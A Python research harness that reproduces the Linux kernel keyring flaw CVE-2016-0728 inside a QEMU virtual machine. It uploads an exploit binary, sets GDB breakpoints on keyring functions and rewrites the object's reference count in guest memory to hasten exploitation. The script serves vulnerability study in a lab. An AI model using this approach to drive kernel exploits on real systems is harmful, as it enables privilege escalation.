#!/usr/bin/python
inspect_vm = 0
from pwn import *
import sys
sys.path.append('/home/ww9210/develop/vminstance')
sys.path.append('/home/ww9210/develop/dataflowanalyzer')
import vminstance
import dataflowanalyzer
import subprocess
import re
import random

def test_0728(gdb_port=random.randint(15000,16000)):
    context.update(arch = 'amd64')
    start_time = time.time()
    vm = vminstance.vmInstance(qemu_config_file = \
            '/home/ww9210/develop/kuafffp/poc_qemu_config/cve-2016-0728-nokasan.cfg' \
            , gdb_deamon_port = gdb_port\
            , log_filename = 'vm_log_0728_ce.txt'\
            , start_grace_time = 5\
            , enable_kvm = True\
            , two_cpus = True\
            )
    vm.run_gdb_deamon()
    vm.run()
    vm.connect()

    vm.s.put('exp_boost')
    sh = vm.s.shell('/bin/sh')
    sh.sendline('chmod +x ./exp_boost')
    sleep(1)

    gdb = dataflowanalyzer.DebuggerGdb(gdbport = gdb_port, qemu_gdbport = vm.qemu_config.gdb_port\
            , vmlinux_path = vm.qemu_config.vmlinux_path)

    gdb.connectGdb()
    gdb.loadVmlinux()
    gdb.connectQemu()
    gdb.b(0xffffffff812dcca8)
    """
    0xffffffff812dcca2 <join_session_keyring+114>:   mov    rsi,r13
    0xffffffff812dcca5 <join_session_keyring+117>:    mov    rdi,r12
    0xffffffff812dcca8 <join_session_keyring+120>: call   0xffffffff812dc8b0 <install_session_keyring_to_cred>
    """
    gdb.b('wait_for_key_construction')
    gdb.c()
    
    sh.sendline('./exp_boost ww9210')
    print 'catching...'
    gdb.catch()
    obj_base = gdb.get_reg('rsi')
    print 'object base is: ', hex(obj_base)
    gdb.delete(1)
    gdb.cmd('watch *'+hex(obj_base))
    for i in range(5):
        gdb.c()
        cont = gdb.catch()
        print cont
        if 'key_put' in cont and '0xffffffff812d8d28' in cont and gdb.xgx(obj_base)&0xffffffff == 2:
            gdb.set_int(obj_base, 1)
            gdb.delete(2)
            gdb.delete(3)
            gdb.b(0xffffffff81048b00)
            gdb.c()
            break


    print 'object base', hex(obj_base)
    gdb.Gdbinteractive()
    sh.interactive()

    vm.shutdown()

if __name__ == '__main__':
    test_0728()
